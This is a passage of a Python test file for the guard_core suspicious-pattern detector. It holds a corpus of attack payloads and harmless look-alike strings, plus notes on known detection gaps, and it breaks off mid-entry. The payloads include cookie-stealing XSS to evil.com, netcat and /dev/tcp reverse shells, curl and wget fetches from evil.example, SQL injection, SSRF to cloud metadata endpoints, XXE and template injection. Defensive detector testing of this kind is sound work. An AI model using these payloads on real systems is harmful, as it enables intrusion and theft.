import time
from typing import NamedTuple

import pytest

from guard_core.handlers.suspatterns_handler import (
    ALL_DETECTION_CATEGORIES,
    SusPatternsManager,
)
from guard_core.models import SecurityConfig


class MaliciousCase(NamedTuple):
    case_id: str
    category: str
    payload: str
    detector: str = "production"
    known_gap_reason: str = ""


class BenignCase(NamedTuple):
    case_id: str
    payload: str
    detector: str = "production"
    known_false_positive_reason: str = ""


def _build_isolated_manager(config: SecurityConfig | None) -> SusPatternsManager:
    original_instance = SusPatternsManager._instance
    original_config = SusPatternsManager._config
    SusPatternsManager._instance = None
    SusPatternsManager._config = None
    manager = SusPatternsManager(config) if config else SusPatternsManager()
    SusPatternsManager._instance = original_instance
    SusPatternsManager._config = original_config
    return manager


_PRODUCTION_MANAGER = _build_isolated_manager(None)

_ENCODING_AWARE_MANAGER = _build_isolated_manager(SecurityConfig())
_ENCODING_AWARE_MANAGER._semantic_analyzer = None

_DETECTORS: dict[str, SusPatternsManager] = {
    "production": _PRODUCTION_MANAGER,
    "encoding_aware": _ENCODING_AWARE_MANAGER,
}

_TRUNCATION_FILLER = (
    "The quarterly report summarizes engagement metrics across every region "
    "and highlights the onboarding funnel improvements shipped last sprint. "
) * 90

MALICIOUS_CORPUS: list[MaliciousCase] = [
    MaliciousCase("xss_basic_script_alert", "xss", "<script>alert(1)</script>"),
    MaliciousCase(
        "xss_cookie_exfil",
        "xss",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ),
    MaliciousCase(
        "xss_javascript_protocol", "xss", "javascript:alert(document.cookie)"
    ),
    MaliciousCase("xss_img_onerror", "xss", "<img src=x onerror=alert(1)>"),
    MaliciousCase("xss_body_onload", "xss", "<body onload=alert(1)>"),
    MaliciousCase(
        "xss_anchor_href_javascript", "xss", '<a href="javascript:alert(1)">click</a>'
    ),
    MaliciousCase(
        "xss_style_url_expression",
        "xss",
        '<div style="background:url(javascript:alert(1))">',
    ),
    MaliciousCase("xss_object_tag", "xss", '<object data="evil.html">payload</object>'),
    MaliciousCase("xss_svg_onload", "xss", "<svg onload=alert(1)>"),
    MaliciousCase("xss_embed_tag", "xss", "<embed src=evil.swf>malicious</embed>"),
    MaliciousCase(
        "xss_base64_wrapped_script_alert",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_past_truncation_cutoff_script_alert",
        "xss",
        _TRUNCATION_FILLER + "<script>alert(document.cookie)</script>",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_base64_wrapped_script_alert_with_cyrillic_suffix",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"
        "0JDQkdCS0JPQlNCV0JbQl9CY0Jk=",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_base64_wrapped_script_alert_with_invalid_utf8_byte",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+gA==",
        "encoding_aware",
    ),
    MaliciousCase(
        "sqli_select_where_password", "sqli", "SELECT password FROM users WHERE id=1"
    ),
    MaliciousCase("sqli_select_star", "sqli", "SELECT * FROM accounts"),
    MaliciousCase("sqli_union_select_null", "sqli", "' UNION SELECT NULL,NULL,NULL--"),
    MaliciousCase("sqli_or_tautology", "sqli", "1' OR '1'='1"),
    MaliciousCase("sqli_trailing_comment_dashdash", "sqli", "admin'--"),
    MaliciousCase("sqli_stacked_drop_table", "sqli", "1'; DROP TABLE users;--"),
    MaliciousCase("sqli_time_based_sleep", "sqli", "id=5 AND SLEEP(5)"),
    MaliciousCase(
        "sqli_benchmark_blind", "sqli", "id=1 AND BENCHMARK(5000000,MD5('A'))"
    ),
    MaliciousCase(
        "sqli_load_file_read", "sqli", "id=1 UNION SELECT LOAD_FILE('/etc/passwd')"
    ),
    MaliciousCase("sqli_mysql_version_comment", "sqli", "1' /*!50000OR*/ '1'='1"),
    MaliciousCase("sqli_outfile_write", "sqli", "SELECT 'x' INTO OUTFILE '/tmp/x.php'"),
    MaliciousCase("sqli_order_by_enum", "sqli", "1' ORDER BY 1--"),
    MaliciousCase(
        "sqli_base64_wrapped_select_where",
        "sqli",
        "U0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnMgV0hFUkUgaWQ9MQ==",
        "encoding_aware",
    ),
    MaliciousCase("sqli_order_by_string_end_no_comment", "sqli", "1' ORDER BY 3"),
    MaliciousCase("sqli_hash_comment_string_end", "sqli", "admin'#"),
    MaliciousCase(
        "dir_traversal_double_dotdot_slash", "dir_traversal", "../../../../etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_windows_backslash",
        "dir_traversal",
        "..\\..\\..\\..\\windows\\win.ini",
    ),
    MaliciousCase(
        "dir_traversal_etc_passwd_suffix", "dir_traversal", "uploads/../../etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_etc_shadow_suffix", "dir_traversal", "files/../../etc/shadow"
    ),
    MaliciousCase(
        "dir_traversal_boot_ini_suffix", "dir_traversal", "download?file=../../boot.ini"
    ),
    MaliciousCase(
        "dir_traversal_proc_self_environ",
        "dir_traversal",
        "logs/../../proc/self/environ",
    ),
    MaliciousCase(
        "path_traversal_encoded_dotdot", "path_traversal", "%2e%2e/%2e%2e/etc/passwd"
    ),
    MaliciousCase(
        "path_traversal_double_encoded_dotdot",
        "path_traversal",
        "%252e%252e/%252e%252e/etc/passwd",
    ),
    MaliciousCase(
        "path_traversal_unicode_fullwidth_dot",
        "path_traversal",
        "%uff0e%uff0e/etc/passwd",
    ),
    MaliciousCase(
        "path_traversal_overlong_utf8_dot", "path_traversal", "%c0%ae%c0%ae/etc/passwd"
    ),
    MaliciousCase(
        "path_traversal_double_url_encoded_slash",
        "path_traversal",
        "%25c0%25ae/etc/passwd",
    ),
    MaliciousCase("cmd_bare_backtick_whoami", "cmd_injection", "`whoami`"),
    MaliciousCase("cmd_bare_backtick_id", "cmd_injection", "`id`"),
    MaliciousCase(
        "cmd_separator_semicolon_cat_flag", "cmd_injection", "; cat -la /etc/passwd"
    ),
    MaliciousCase("cmd_pipe_wget", "cmd_injection", "| wget http://evil.example/x"),
    MaliciousCase("cmd_separator_dollar_paren", "cmd_injection", "; $(whoami)"),
    MaliciousCase(
        "cmd_separator_dollar_brace", "cmd_injection", "| ${IFS}cat${IFS}/etc/passwd"
    ),
    MaliciousCase("cmd_shell_dash_c", "cmd_injection", "; bash -c id"),
    MaliciousCase(
        "cmd_eval_call",
        "cmd_injection",
        "eval(\"require('child_process').exec('id')\")",
    ),
    MaliciousCase("cmd_separator_pipe_id", "cmd_injection", "|id"),
    MaliciousCase(
        "cmd_netcat_reverse_shell", "cmd_injection", "nc -e /bin/sh 10.0.0.1 4444"
    ),
    MaliciousCase(
        "cmd_dev_tcp_reverse_shell", "cmd_injection", "/dev/tcp/10.0.0.1/4444"
    ),
    MaliciousCase("cmd_chained_semicolon_id_whoami", "cmd_injection", "`id`; `whoami`"),
    MaliciousCase("cmd_separator_ampersand_reboot", "cmd_injection", "& `reboot`"),
    MaliciousCase(
        "cmd_double_pipe_curl", "cmd_injection", "|| curl http://evil.example/x"
    ),
    MaliciousCase(
        "cmd_separator_semicolon_nc",
        "cmd_injection",
        "; nc -e /bin/sh 10.0.0.1 4444",
    ),
    MaliciousCase(
        "cmd_glued_prefix_known_gap",
        "cmd_injection",
        "search`id`",
        "production",
        "the backtick pattern is anchored with \\A...\\Z over the whole "
        "scanned string, so a payload glued to a preceding token never matches",
    ),
    MaliciousCase(
        "cmd_glued_suffix_known_gap",
        "cmd_injection",
        "`id`suffix",
        "production",
        "the backtick pattern is anchored with \\A...\\Z over the whole "
        "scanned string, so a payload glued to a trailing token never matches",
    ),
    MaliciousCase(
        "cmd_base64_wrapped_reverse_shell",
        "cmd_injection",
        "fCBuYyAtZSAvYmluL3NoIDEwLjAuMC4xIDQ0NDQ=",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_base64_wrapped_query_param",
        "cmd_injection",
        "payload=fCBuYyAtZSAvYmluL3NoIDEwLjAuMC4xIDQ0NDQ=",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_past_truncation_cutoff_semicolon_cat",
        "cmd_injection",
        _TRUNCATION_FILLER + "; cat /etc/passwd",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_past_truncation_cutoff_backtick_whoami",
        "cmd_injection",
        _TRUNCATION_FILLER + "`whoami`",
        "encoding_aware",
        "truncate_safely keeps roughly 100 chars of surrounding filler "
        "context around a preserved attack region, which breaks the backtick "
        "pattern's whole-string \\A...\\Z anchor even though the payload "
        "itself survives truncation",
    ),
    MaliciousCase("cmd_shell_dash_c_at_string_start", "cmd_injection", "sh -c id"),
    MaliciousCase(
        "file_inclusion_php_wrapper",
        "file_inclusion",
        "php://filter/convert.base64-encode/resource=index.php",
    ),
    MaliciousCase(
        "file_inclusion_data_wrapper",
        "file_inclusion",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOw==",
    ),
    MaliciousCase("file_inclusion_expect_wrapper", "file_inclusion", "expect://id"),
    MaliciousCase(
        "file_inclusion_zip_wrapper",
        "file_inclusion",
        "zip://shell.jpg%23payload.php",
    ),
    MaliciousCase(
        "file_inclusion_phar_wrapper",
        "file_inclusion",
        "phar://upload/shell.phar/payload.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_bare",
        "file_inclusion",
        "//evil.com/shell.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_param",
        "file_inclusion",
        "?file=//evil.com/x.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_src",
        "file_inclusion",
        "src=//evil.io/malicious.js",
    ),
    MaliciousCase("ldap_wildcard_or_filter", "ldap", "(|(uid=*)(cn=*))"),
    MaliciousCase(
        "ldap_wildcard_equals",
        "ldap",
        "cn=*)(uid=*",
        "production",
        "no ldap pattern matches a wildcard fragment that lacks a leading "
        "(& or (| conjunction paren",
    ),
    MaliciousCase("ldap_and_filter_injection", "ldap", "(&(objectClass=user)(uid=*))"),
    MaliciousCase("ldap_bare_or_paren", "ldap", "admin)(|(password=*"),
    MaliciousCase(
        "ldap_wildcard_password_bypass",
        "ldap",
        "*)(password=*)",
        "production",
        "no ldap pattern matches a wildcard fragment that lacks a leading "
        "(& or (| conjunction paren",
    ),
    MaliciousCase("ldap_nested_filter_bypass", "ldap", "(|(&"),
    MaliciousCase(
        "xml_external_entity_file",
        "xml",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ),
    MaliciousCase(
        "xml_external_entity_http",
        "xml",
        '<!ENTITY xxe SYSTEM "http://evil.example/xxe">',
    ),
    MaliciousCase(
        "xml_cdata_script_wrapper", "xml", "<![CDATA[<script>alert(1)</script>]]>"
    ),
    MaliciousCase(
        "xml_declaration_with_entity",
        "xml",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/shadow">]>',
    ),
    MaliciousCase(
        "ssrf_aws_metadata_ip", "ssrf", "http://169.254.169.254/latest/meta-data/"
    ),
    MaliciousCase("ssrf_localhost_admin", "ssrf", "http://localhost:8080/admin"),
    MaliciousCase("ssrf_private_class_c", "ssrf", "http://192.168.1.1/admin"),
    MaliciousCase("ssrf_private_class_a", "ssrf", "http://10.0.0.1/admin"),
    MaliciousCase(
        "ssrf_gcp_metadata_internal",
        "ssrf",
        "http://metadata.google.internal/computeMetadata/v1/",
    ),
    MaliciousCase("ssrf_decimal_encoded_loopback", "ssrf", "http://2130706433/"),
    MaliciousCase("ssrf_octal_encoded_loopback", "ssrf", "http://0177.0.0.1/"),
    MaliciousCase("ssrf_hex_encoded_loopback", "ssrf", "http://0x7f000001/"),
    MaliciousCase("ssrf_hex_dotted_private_192", "ssrf", "http://0xC0.0xA8.1.1/"),
    MaliciousCase("ssrf_file_wrapper", "ssrf", "file:///etc/passwd"),
    MaliciousCase("ssrf_gopher_wrapper", "ssrf", "gopher://127.0.0.1:6379/_INFO"),
    MaliciousCase("ssrf_dict_wrapper", "ssrf", "dict://127.0.0.1:11211/stat"),
    MaliciousCase(
        "ssrf_alibaba_metadata", "ssrf", "http://100.100.100.200/latest/meta-data/"
    ),
    MaliciousCase("ssrf_unspecified_with_port", "ssrf", "reset via 0.0.0.0:9999 first"),
    MaliciousCase(
        "ssrf_base64_wrapped_metadata_url",
        "ssrf",
        "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==",
        "encoding_aware",
    ),
    MaliciousCase(
        "ssrf_past_truncation_cutoff_metadata",
        "ssrf",
        _TRUNCATION_FILLER + "http://169.254.169.254/latest/meta-data/",
        "encoding_aware",
        "extract_attack_regions has no indicator for bare private or "
        "metadata IP literals, so a plain SSRF URL with no other indicator "
        "character produces zero preserved regions and falls back to naive "
        "prefix truncation, dropping a payload placed past the cutoff",
    ),
    MaliciousCase("nosql_gt_operator_quoted", "nosql", '{"$gt":""}'),
    MaliciousCase("nosql_ne_operator_quoted", "nosql", '{"$ne":null}'),
    MaliciousCase(
        "nosql_where_operator_object",
        "nosql",
        '{"$where": "this.password.length > 0"}',
    ),
    MaliciousCase(
        "nosql_regex_operator", "nosql", '{"username": {"$regex": "^admin"}}'
    ),
    MaliciousCase(
        "nosql_in_operator_array", "nosql", '{"role": {"$in": ["admin","root"]}}'
    ),
    MaliciousCase("nosql_exists_operator", "nosql", '{"$exists": true}'),
    MaliciousCase("file_upload_php_extension", "file_upload", 'filename="shell.php"'),
    MaliciousCase(
        "file_upload_phtml_extension", "file_upload", 'filename="shell.phtml"'
    ),
    MaliciousCase(
        "file_upload_jsp_extension", "file_upload", 'filename="webshell.jsp"'
    ),
    MaliciousCase(
        "file_upload_double_extension_phar", "file_upload", "filename='avatar.phar'"
    ),
    MaliciousCase("file_upload_asp_extension", "file_upload", 'filename="cmd.asp"'),
    MaliciousCase(
        "file_upload_exe_extension", "file_upload", 'filename="installer.exe"'
    ),
    MaliciousCase(
        "template_double_curly_system",
        "template",
        "{{ config.__class__.__init__.__globals__.os.system }}",
    ),
    MaliciousCase(
        "template_percent_curly_exec",
        "template",
        "{% self.__init__.__globals__.__builtins__.exec %}",
    ),
    MaliciousCase(
        "template_erb_runtime_exec",
        "template",
        "<%= Runtime.getRuntime().exec('id') %>",
    ),
    MaliciousCase(
        "template_ognl_el_injection",
        "template",
        "${@java.lang.Runtime@getRuntime().exec('id')}",
    ),
    MaliciousCase("template_dollar_brace_arithmetic", "template", "${7*7}"),
    MaliciousCase(
        "template_erb_file_read", "template", "<%= File.read('/etc/passwd') %>"
    ),
    MaliciousCase(
        "http_split_crlf_location",
        "http_split",
        "search=x\r\nLocation: http://evil.example",
    ),
    MaliciousCase(
        "http_split_crlf_set_cookie",
        "http_split",
        "id=1\r\nSet-Cookie: session=hijacked",
    ),
    MaliciousCase(
        "http_split_crlf_http_response", "http_split", "name=x\r\nHTTP/1.1 200 OK"
    ),
    MaliciousCase(
        "http_split_newline_only_location",
        "http_split",
        "value\nLocation: http://evil.example",
    ),
    MaliciousCase("sensitive_file_dotenv_root", "sensitive_file", "/.env"),
    MaliciousCase("sensitive_file_dotenv_local", "sensitive_file", "/.env.local"),
    MaliciousCase("sensitive_file_config_yml", "sensitive_file", "/app-config.yml"),
    MaliciousCase(
        "sensitive_file_sourcemap", "sensitive_file", "/static/bundle.js.map"
    ),
    MaliciousCase("sensitive_file_python_source", "sensitive_file", "/app/settings.py"),
    MaliciousCase("sensitive_file_git_dir", "sensitive_file", "/.git/config"),
    MaliciousCase("cms_probing_wp_admin", "cms_probing", "/wp-admin/"),
    MaliciousCase("cms_probing_wp_login", "cms_probing", "/wp-login.php"),
    MaliciousCase("cms_probing_xmlrpc", "cms_probing", "/xmlrpc.php"),
    MaliciousCase("cms_probing_phpinfo", "cms_probing", "/phpinfo.php"),
    MaliciousCase("cms_probing_backup_extension", "cms_probing", "/site.bak"),
    MaliciousCase("cms_probing_htpasswd", "cms_probing", "/.htpasswd"),
    MaliciousCase(
        "cms_probing_wp_admin_nested_path",
        "cms_probing",
        "/blog/wp-admin/setup.php",
    ),
    MaliciousCase("cms_probing_phpinfo_with_query", "cms_probing", "/info.php?x=1"),
    MaliciousCase("recon_actuator_probe", "recon", "/actuator/health"),
    MaliciousCase("recon_server_status", "recon", "/server-status"),
    MaliciousCase("recon_cgi_bin_probe", "recon", "/cgi-bin/test.cgi"),
    MaliciousCase("recon_appsettings_json", "recon", "/appsettings.json"),
    MaliciousCase("recon_pom_xml", "recon", "/pom.xml"),
    MaliciousCase("recon_readme_md", "recon", "/README.md"),
    MaliciousCase("recon_git_head", "recon", "/.git/HEAD"),
    MaliciousCase("recon_owa_probe", "recon", "/owa/auth/logon.aspx"),
    MaliciousCase(
        "recon_actuator_nested_with_query",
        "recon",
        "/api/actuator/health?trace=1",
    ),
    MaliciousCase("recon_git_refs_nested_path", "recon", "/repo/.git/refs/heads/main"),
    MaliciousCase(
        "recon_docker_compose_nested_with_query",
        "recon",
        "/infra/docker-compose.yml?raw=1",
    ),
    MaliciousCase("recon_secrets_nested_path", "recon", "/config/app-secrets.yml"),
    MaliciousCase(
        "proto_pollution_isadmin_key",
        "proto_pollution",
        '{"__proto__":{"isAdmin":true}}',
    ),
    MaliciousCase(
        "proto_pollution_constructor_prototype",
        "proto_pollution",
        'constructor["prototype"]["polluted"]=true',
    ),
    MaliciousCase(
        "proto_pollution_prototype_dot_access",
        "proto_pollution",
        "constructor.prototype.polluted = true",
    ),
    MaliciousCase(
        "proto_pollution_proto_bracket_key",
        "proto_pollution",
        '{"__proto__" : {"role":"admin"}}',
    ),
    MaliciousCase(
        "proto_pollution_base64_wrapped_isadmin",
        "proto_pollution",
        "eyJfX3Byb3RvX18iOnsiaXNBZG1pbiI6dHJ1ZX19",
        "encoding_aware",
    ),
    MaliciousCase(
        "code_injection_process_start",
        "code_injection",
        'System.Diagnostics.Process.Start("cmd.exe","/c whoami")',
    ),
    MaliciousCase(
        "code_injection_reflection_namespace",
        "code_injection",
        "System.Reflection.Assembly.GetExecutingAssembly()",
    ),
    MaliciousCase(
        "code_injection_assembly_load",
        "code_injection",
        "Assembly.Load(maliciousBytes)",
    ),
]

BENIGN_CORPUS: list[BenignCase] = [
    BenignCase(
        "xss_docs_script_tag_mention",
        "The `<script>` tag loads external JavaScript resources.",
    ),
    BenignCase(
        "xss_docs_event_handler_mention",
        "Set `onload` and `onerror` handlers carefully to avoid leaking cookies.",
    ),
    BenignCase(
        "xss_docs_javascript_mention",
        "Our onboarding docs mention JavaScript best practices for legacy browsers.",
    ),
    BenignCase(
        "xss_json_event_handler_keys", '{"onclick": "handleClick", "onload": "init"}'
    ),
    BenignCase(
        "xss_docs_style_attribute_mention",
        'Use `style="color:red"` for basic inline styling.',
    ),
    BenignCase(
        "xss_docs_embed_object_mention",
        "`<embed>` and `<object>` tags are deprecated in favor of standard "
        "media elements.",
    ),
    BenignCase(
        "xss_prose_script_kiddie_joke",
        "I love using <3 emoji and script kiddie jokes in my bio.",
    ),
    BenignCase(
        "xss_docs_onerror_callback_explainer",
        "The onError callback receives the exception object as its only argument.",
    ),
    BenignCase(
        "sqli_prose_select_few_items",
        "I'll select a few items from the catalog for you",
    ),
    BenignCase(
        "sqli_prose_select_candidates",
        "we will select candidates from the applicant pool",
    ),
    BenignCase(
        "sqli_prose_order_by_no_digit", "please order by phone or email when you can"
    ),
    BenignCase(
        "sqli_prose_drop_by_office",
        "We dropped the old table last quarter when we migrated to the new schema.",
    ),
    BenignCase(
        "sqli_json_query_select_from", '{"query": "SELECT id FROM cache", "ttl": 60}'
    ),
    BenignCase(
        "sqli_prose_where_equals_no_space",
        "Please specify where=kitchen for the delivery instructions.",
    ),
    BenignCase(
        "sqli_prose_select_join_no_from",
        "In the interview, she asked about SELECT and JOIN clauses in SQL.",
    ),
    BenignCase(
        "sqli_prose_1_equals_1_bug_report",
        "The bug was triggered by 1=1 always evaluating true in the validator.",
    ),
    BenignCase(
        "sqli_markdown_backtick_select",
        "Run `SELECT id FROM users` in the console to verify the migration.",
    ),
    BenignCase(
        "sqli_changelog_mysql_upgrade",
        "Upgraded MySQL and re-ran `ANALYZE TABLE` on the largest tables.",
    ),
    BenignCase("dir_traversal_filename_with_single_dotdot", "reports/../summary.csv"),
    BenignCase(
        "dir_traversal_prose_parent_directory",
        "Move the archive up one directory using the parent folder shortcut.",
    ),
    BenignCase(
        "dir_traversal_windows_path_no_dotdot",
        "C:\\Users\\alice\\Documents\\report.docx",
    ),
    BenignCase("dir_traversal_relative_path_no_dotdot", "./assets/images/logo.png"),
    BenignCase(
        "dir_traversal_etc_passwd_prose_mention",
        "The `/etc/passwd` file lists local user accounts on Unix systems.",
    ),
    BenignCase("dir_traversal_single_dotdot_no_repeat", "../shared/notes.txt"),
    BenignCase(
        "dir_traversal_single_dotdot_archive_path", "backup/../archive/2024.tar.gz"
    ),
    BenignCase(
        "dir_traversal_prose_two_dots_explainer",
        "Parent directories are referenced with two dots in Unix shells.",
    ),
    BenignCase("path_traversal_url_with_percent_20", "search?q=hello%20world"),
    BenignCase("path_traversal_url_encoded_slash_only", "path%2Fto%2Ffile"),
    BenignCase(
        "path_traversal_prose_percent_encoding",
        "The percent-encoding for a space character is %20 in URLs.",
    ),
    BenignCase("path_traversal_percent_25_off", "search?tag=100%25off"),
    BenignCase(
        "path_traversal_prose_percent20_percent2f",
        "URL-encoded spaces use %20 while encoded slashes use %2F.",
    ),
    BenignCase(
        "cmd_injection_markdown_ls_mention", "Run `ls` to list files in the directory."
    ),
    BenignCase(
        "cmd_injection_markdown_curl_snippet",
        "Try `curl -X GET` against the users endpoint.",
    ),
    BenignCase(
        "cmd_injection_sql_backtick_identifier",
        "SELECT `id`, `name` FROM `users` WHERE `active` = 1",
    ),
    BenignCase(
        "cmd_injection_js_template_literal_url",
        "const url = `https://api.example.com/users/${userId}`;",
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_sentence", "first do this; then enjoy your day"
    ),
    BenignCase(
        "cmd_injection_backtick_wrapped_dollar_paren", "see the `$(id)` example"
    ),
    BenignCase("cmd_injection_shell_docs_var_expansion", "export PATH=${HOME}/bin"),
    BenignCase(
        "cmd_injection_changelog_reboot_mention",
        "The `reboot` command now requires confirmation.",
    ),
    BenignCase(
        "cmd_injection_prose_double_ampersand_operator",
        "&& is the logical AND operator in most C-like languages.",
    ),
    BenignCase(
        "cmd_injection_commit_message_docker_bump",
        "chore: bump `docker` base image to 3.12-slim",
    ),
    BenignCase("file_inclusion_ordinary_https_url", "https://example.com/path?a=1"),
    BenignCase("file_inclusion_ordinary_http_url", "http://example.com"),
    BenignCase(
        "file_inclusion_json_webhook_url",
        '{"callback_url": "https://api.customer.com/webhook"}',
    ),
    BenignCase(
        "file_inclusion_prose_docs_link",
        "see https://github.com/rennf93/guard-core for the source",
    ),
    BenignCase(
        "file_inclusion_query_string_encoded",
        "https://example.com/callback?redirect=%2Fhome",
    ),
    BenignCase("file_inclusion_ipv6_literal_url", "https://[2001:db8::1]/path"),
    BenignCase("file_inclusion_ftp_url", "ftp://ftp.example.com/pub/file.txt"),
    BenignCase(
        "ldap_prose_wildcard_search_mention",
        "Use an asterisk wildcard in your search query to match partial names.",
    ),
    BenignCase(
        "ldap_prose_and_or_boolean_logic",
        "The filter combines AND and OR boolean logic for the report.",
    ),
    BenignCase(
        "ldap_markdown_equals_example",
        "Set `role = admin` in the config to grant elevated access.",
    ),
    BenignCase(
        "ldap_prose_directory_lookup",
        "The directory lookup returned all users in the marketing group.",
    ),
    BenignCase(
        "ldap_prose_bind_service_account",
        "The LDAP bind used a service account with read-only scope.",
    ),
    BenignCase(
        "ldap_prose_filter_syntax_explainer",
        "Filter syntax in LDAP uses parentheses to group conditions.",
    ),
    BenignCase(
        "xml_ordinary_declaration_no_entity",
        '<?xml version="1.0" encoding="UTF-8"?><note><body>Hello</body></note>',
    ),
    BenignCase(
        "xml_prose_cdata_explainer",
        "A CDATA section lets you embed raw text without escaping special characters.",
    ),
    BenignCase(
        "xml_prose_entity_explainer",
        "An XML entity like `&amp;` represents a reserved character.",
    ),
    BenignCase(
        "xml_config_snippet_no_doctype",
        "<settings><timeout>30</timeout><retries>3</retries></settings>",
    ),
    BenignCase(
        "xml_prose_soap_envelope",
        "The SOAP envelope wraps the XML body in a standard namespace.",
    ),
    BenignCase("ssrf_known_good_benign_stripe", "https://api.stripe.com/v1/charges"),
    BenignCase("ssrf_known_good_benign_github", "https://github.com/anthropics/claude"),
    BenignCase("ssrf_version_like_text", "software 10.4.2 release"),
    BenignCase(
        "ssrf_bare_two_octet_prefix", "192.168 is a common prefix in networking docs"
    ),
    BenignCase("ssrf_public_dns_google", "http://8.8.8.8/"),
    BenignCase("ssrf_localhost_lookalike_domain", "localhost.example.com/callback"),
    BenignCase("ssrf_notlocalhost_domain", "https://notlocalhost.io/status"),
    BenignCase("ssrf_private_ip_lookalike_domain", "https://192-168-1-1.nip.io/"),
    BenignCase(
        "ssrf_aws_apigateway_url",
        "https://apigateway.us-east-1.amazonaws.com/prod/resource",
    ),
    BenignCase(
        "ssrf_slack_webhook_url", "https://hooks.slack.com/services/T000/B000/XXXX"
    ),
    BenignCase("ssrf_scheme_port_redis", "redis://6379"),
    BenignCase("ssrf_scheme_port_grpc", "grpc://50051"),
    BenignCase("ssrf_scheme_port_amqp", "amqp://5672"),
    BenignCase("ssrf_scheme_port_https_path", "https://2023/blog"),
    BenignCase(
        "ssrf_scheme_port_tcp_prose",
        "connect via tcp://8080 for the health probe",
    ),
    BenignCase("nosql_benign_dollar_value_price", '{"price":"$25","name":"coffee"}'),
    BenignCase(
        "nosql_benign_plain_query_object", '{"username": "alice", "role": "admin"}'
    ),
    BenignCase(
        "nosql_prose_mongodb_operator_mention",
        "MongoDB operators like $gt and $lt let you build range queries.",
    ),
    BenignCase(
        "nosql_benign_nested_object_no_operator",
        '{"address": {"city": "Berlin", "zip": "10115"}}',
    ),
    BenignCase(
        "nosql_benign_cart_total_object",
        '{"cart_total": {"currency": "USD", "amount": 42.5}}',
    ),
    BenignCase(
        "nosql_prose_aggregation_pipeline",
        "MongoDB aggregation pipelines chain multiple stage operators together.",
    ),
    BenignCase("file_upload_benign_png_filename", 'filename="avatar.png"'),
    BenignCase("file_upload_benign_pdf_filename", 'filename="invoice.pdf"'),
    BenignCase("file_upload_benign_docx_filename", "filename='report.docx'"),
    BenignCase(
        "file_upload_prose_upload_limits",
        "Uploaded files are limited to 10 MB and must be JPEG or PNG.",
    ),
    BenignCase("file_upload_benign_pptx_filename", 'filename="presentation.pptx"'),
    BenignCase(
        "file_upload_prose_accepted_formats",
        "Accepted upload formats are PNG, JPG, and PDF only.",
    ),
    BenignCase(
        "template_benign_mustache_interpolation",
        "The template uses `{{ user.name }}` for interpolation.",
    ),
    BenignCase(
        "template_benign_jinja_if_block",
        "Our Jinja template renders `{% if active %}` blocks conditionally.",
    ),
    BenignCase(
        "template_benign_dollar_brace_var",
        "Set the amount with ${amount} in the template.",
    ),
    BenignCase(
        "template_benign_makefile_variable",
        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
    ),
    BenignCase(
        "template_prose_erb_explainer",
        "ERB templates use `<%= %>` to output Ruby expressions in HTML.",
    ),
    BenignCase(
        "template_prose_handlebars_explainer",
        "Handlebars templates use double curly braces {{ }} for variable "
        "interpolation.",
    ),
    BenignCase(
        "http_split_prose_crlf_explainer",
        "CRLF stands for carriage return and line feed, used to end HTTP header lines.",
    ),
    BenignCase(
        "http_split_benign_multiline_body",
        "Line one of the message.\nLine two of the message.\nLine three.",
    ),
    BenignCase(
        "http_split_prose_location_header_mention",
        "The `Location` header is set by the server to trigger a redirect.",
    ),
    BenignCase(
        "http_split_prose_set_cookie_mention",
        "The response included a `Set-Cookie` header for session tracking.",
    ),
    BenignCase(
        "http_split_prose_redirect_mention",
        "Redirects use the `Location` header with a 302 status code.",
    ),
    BenignCase(
        "sensitive_file_benign_env_example",
        "See `.env.example` for the list of required environment variables.",
    ),
    BenignCase(
        "sensitive_file_benign_readme_reference",
        "Please review `README.md` before opening a PR.",
    ),
    BenignCase(
        "sensitive_file_benign_settings_yml_mention",
        "See the config file `settings.yml` for defaults.",
    ),
    BenignCase(
        "sensitive_file_benign_source_extension_prose",
        "Our backend is written in Python (`.py`) and Go (`.go`).",
    ),
    BenignCase("cms_probing_robots_txt", "/robots.txt"),
    BenignCase("cms_probing_sitemap_xml", "/sitemap.xml"),
    BenignCase("cms_probing_security_txt", "/security.txt"),
    BenignCase(
        "cms_probing_prose_wordpress_mention",
        "We migrated our blog off WordPress last year.",
    ),
    BenignCase("recon_robots_txt", "/robots.txt"),
    BenignCase("recon_sitemap_xml", "/sitemap.xml"),
    BenignCase("recon_security_txt", "/security.txt"),
    BenignCase(
        "recon_prose_actuator_explainer",
        "Spring Boot actuator endpoints expose health and metrics data.",
    ),
    BenignCase("recon_normal_api_route", "/api/v1/users/42"),
    BenignCase(
        "proto_pollution_benign_prototype_docs",
        "JavaScript objects inherit from `Object.prototype` by default.",
    ),
    BenignCase(
        "proto_pollution_benign_constructor_mention",
        "The `constructor` property points back to the class that created "
        "the instance.",
    ),
    BenignCase(
        "proto_pollution_benign_admin_flag_json", '{"role": "admin", "active": true}'
    ),
    BenignCase(
        "proto_pollution_prose_tutorial_reference",
        "The class `__proto__` reference is used to explain JS inheritance "
        "in the tutorial.",
    ),
    BenignCase(
        "proto_pollution_benign_constructor_value",
        '{"user": {"name": "alice", "constructor": "Employee"}}',
    ),
    BenignCase(
        "code_injection_prose_reflection_explainer",
